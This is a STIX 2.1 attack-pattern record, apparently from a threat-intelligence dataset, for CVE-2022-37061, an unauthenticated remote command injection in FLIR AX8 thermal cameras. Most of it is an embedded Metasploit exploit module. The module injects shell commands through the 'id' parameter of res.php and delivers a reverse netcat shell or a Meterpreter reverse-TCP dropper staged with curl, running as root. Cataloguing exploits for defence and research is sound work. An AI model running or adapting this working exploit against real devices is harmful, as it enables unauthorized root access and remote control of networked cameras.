{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fc476146-7f9d-49de-ae62-2628abecccc7",
    "created": "2024-08-14T17:01:38.525755Z",
    "modified": "2024-08-14T17:01:38.525759Z",
    "name": "FLIR AX8 unauthenticated RCE",
    "description": " All FLIR AX8 thermal sensor cameras versions up to and including 1.46.16 are vulnerable to Remote Command Injection. This can be exploited to inject and execute arbitrary shell commands as the root user through the id HTTP POST parameter in the res.php endpoint.  This module uses the vulnerability to upload and execute payloads gaining root privileges.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/flir_ax8_unauth_rce_cve_2022_37061.rb",
            "external_id": "flir_ax8_unauth_rce_cve_2022_37061.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-37061"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/UAZaDsQBfx/cve-2022-37061"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/stopwatch'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'FLIR AX8 unauthenticated RCE',\n        'Description' => %q{\n          All FLIR AX8 thermal sensor cameras versions up to and including 1.46.16 are vulnerable to Remote Command Injection.\n          This can be exploited to inject and execute arbitrary shell commands as the root user through the id HTTP POST parameter\n          in the res.php endpoint.\n\n          This module uses the vulnerability to upload and execute payloads gaining root privileges.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Thomas Knudsen (https://www.linkedin.com/in/thomasjknudsen)', # Security researcher\n          'Samy Younsi (https://www.linkedin.com/in/samy-younsi)', # Security researcher\n          'h00die-gr3y' # metasploit module\n        ],\n        'References' => [\n          ['CVE', '2022-37061'],\n          ['PACKETSTORM', '168114'],\n          ['URL', 'https://attackerkb.com/topics/UAZaDsQBfx/cve-2022-37061'],\n        ],\n        'DisclosureDate' => '2022-08-19',\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_ARMLE],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_netcat'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_ARMLE],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => [ 'curl', 'printf' ],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/armle/meterpreter_reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 80,\n          'SSL' => false\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n  end\n\n  def execute_command(cmd, _opts = {})\n    action_id = rand(1..40)\n    return send_request_cgi({\n      'method' => 'POST',\n      'ctype' => 'application/x-www-form-urlencoded; charset=UTF-8',\n      'uri' => normalize_uri(target_uri.path, 'res.php'),\n      'vars_post' => {\n        'action' => 'alarm',\n        'id' => \"#{action_id};#{cmd}\"\n      }\n    })\n  rescue StandardError => e\n    elog(\"#{peer} - Communication error occurred: #{e.message}\", error: e)\n    print_error(\"Communication error occurred: #{e.message}\")\n    return nil\n  end\n\n  # Checking if the target is vulnerable by executing a randomized sleep to test the remote code execution\n  def check\n    print_status(\"Checking if #{peer} can be exploited!\")\n    sleep_time = rand(5..10)\n    print_status(\"Performing command injection test issuing a sleep command of #{sleep_time} seconds.\")\n    res, elapsed_time = Rex::Stopwatch.elapsed_time do\n      execute_command(\"sleep #{sleep_time}\")\n    end\n\n    return Exploit::CheckCode::Unknown('No response received from the target!') unless res\n\n    print_status(\"Elapsed time: #{elapsed_time} seconds.\")\n    return CheckCode::Safe('Failed to test command injection.') unless elapsed_time >= sleep_time\n\n    CheckCode::Vulnerable('Successfully tested command injection.')\n  end\n\n  def exploit\n    case target['Type']\n    when :unix_cmd\n      print_status(\"Executing #{target.name} with #{payload.encoded}\")\n      execute_command(payload.encoded)\n    when :linux_dropper\n      print_status(\"Executing #{target.name}\")\n      execute_cmdstager\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-08-19",
    "x_mitre_platforms": [
        "linux'"
    ]
}